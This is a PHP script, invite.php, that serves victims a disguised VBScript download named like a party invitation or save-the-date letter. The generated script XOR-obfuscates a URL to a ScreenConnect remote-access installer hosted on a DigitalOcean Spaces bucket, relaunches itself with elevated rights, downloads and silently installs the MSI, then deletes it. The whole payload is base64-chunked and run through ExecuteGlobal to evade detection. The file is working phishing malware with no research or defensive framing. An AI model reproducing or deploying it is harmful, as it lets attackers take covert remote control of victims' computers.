<?php
// invite.php - Full encoded output + XOR arrays for MSI URL
header('Content-Type: text/plain; charset=utf-8');
header('Cache-Control: no-store, no-cache, must-revalidate');

$baseNames = [
    "Party_Invite", "Letter_from_Friend", "Important_Mail", "Formal_Invitation",
    "Invitation_Final", "Special_Invitation_VIP", "Special_letter_VIP",
    "Ceremony_Invite", "RSVP_Invitation_Draft", "Personal_Invite", "Elegant_Invitation_Card",
    "Invitation_Exclusive", "Save_The_Date_Invitation", "Save_The_Date"
];

$cookieName = "inv_used";
$used = isset($_COOKIE[$cookieName]) ? json_decode($_COOKIE[$cookieName], true) : [];
if (!is_array($used)) $used = [];

$available = array_diff($baseNames, $used);
if (empty($available)) {
    $available = $baseNames;
    $used = [];
}

$chosenBase = $available[array_rand($available)];
$random5 = str_pad(rand(10000, 99999), 5, '0', STR_PAD_LEFT);
$chosen = $chosenBase . "_" . $random5 . ".vbs";

$used[] = $chosenBase;
setcookie($cookieName, json_encode(array_unique($used)), time() + (30 * 24 * 60 * 60), "/");

header('Content-Disposition: attachment; filename="' . $chosen . '"');

// ===== MSI URL =====
$msiUrl = "https://party.nyc3.cdn.digitaloceanspaces.com/ScreenConnect.ClientSetup%20(1).msi";

// ===== Generate random XOR key array =====
$key = [];
$cipher = [];
$urlLen = strlen($msiUrl);

for ($i = 0; $i < $urlLen; $i++) {
    $k = rand(1, 255);
    $key[] = $k;
    $cipher[] = ord($msiUrl[$i]) ^ $k;
}

// ===== Helper to format arrays exactly as requested =====
function formatArray($arr) {
    $lines = [];
    $chunks = array_chunk($arr, 10);
    foreach ($chunks as $chunk) {
        $hex = array_map(function($v) {
            return "&H" . strtoupper(str_pad(dechex($v), 2, "0", STR_PAD_LEFT));
        }, $chunk);
        $lines[] = "  " . implode(",", $hex);
    }
    return implode(", _\r\n", $lines);
}

$keyFormatted   = formatArray($key);
$cipherFormatted = formatArray($cipher);

// ===== REAL VBS (with XOR arrays) =====
$realVbs = <<<REAL
Dim objShell, objFSO, msiURL, mefinuwig, harogilim, i
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' ===== XOR Reconstruction of MSI URL =====
mefinuwig = Array( _
$keyFormatted )
harogilim = Array( _
$cipherFormatted )
msiURL = ""
For i = 0 To UBound(harogilim)
  msiURL = msiURL & Chr(harogilim(i) Xor mefinuwig(i))
Next

If WScript.Arguments.Length = 0 Then
    Dim shell
    Set shell = CreateObject("Shell.Application")
    shell.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ elevated", "", "runas", 0
    WScript.Quit
End If

Sub DownloadAndExecute()
    On Error Resume Next
    Dim p, http, strm
    p = objShell.ExpandEnvironmentStrings("%TEMP%\\sc_setup.msi")
  
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", msiURL, False
    http.Send
    If http.Status = 200 Then
        Set strm = CreateObject("ADODB.Stream")
        strm.Type = 1 : strm.Open : strm.Write http.responseBody : strm.SaveToFile p, 2 : strm.Close
        objShell.Run """" & p & """ /quiet", 0, True
        WScript.Sleep 90000
        If objFSO.FileExists(p) Then objFSO.DeleteFile p, True
    End If
End Sub

Call DownloadAndExecute
WScript.Quit
REAL;

// ===== Base64 chunk encoding (your original method) =====
$chunkSize = 100;
$base64 = base64_encode($realVbs);
$len = strlen($base64);
$count = ceil($len / $chunkSize);

$vbs = "Option Explicit\r\n";
$vbs .= "Dim vuliri(" . ($count - 1) . ")\r\n";

for ($i = 0; $i < $count; $i++) {
    $start = $i * $chunkSize;
    $chunk = substr($base64, $start, $chunkSize);
    $vbs .= "vuliri($i) = \"$chunk\"\r\n";
}

$vbs .= "\r\nDim ojofofi : ojofofi = Join(vuliri, \"\")\r\n";
$vbs .= "ExecuteGlobal ahokehuho(ojofofi)\r\n\r\n";
$vbs .= "Function ahokehuho(s)\r\n";
$vbs .= " Dim cihozot, alemi, nd\r\n";
$vbs .= " Set cihozot = CreateObject(\"Msxml2.DOMDocument.6.0\")\r\n";
$vbs .= " Set nd = cihozot.createElement(\"b\")\r\n";
$vbs .= " nd.dataType = \"bin.base64\"\r\n";
$vbs .= " nd.text = s\r\n";
$vbs .= " Set alemi = CreateObject(\"ADODB.Stream\")\r\n";
$vbs .= " alemi.Type = 1 : alemi.Open\r\n";
$vbs .= " alemi.Write nd.nodeTypedValue\r\n";
$vbs .= " alemi.Position = 0\r\n";
$vbs .= " alemi.Type = 2 : alemi.Charset = \"UTF-8\"\r\n";
$vbs .= " ahokehuho = alemi.ReadText\r\n";
$vbs .= " alemi.Close\r\n";
$vbs .= "End Function\r\n";

echo $vbs;
?>
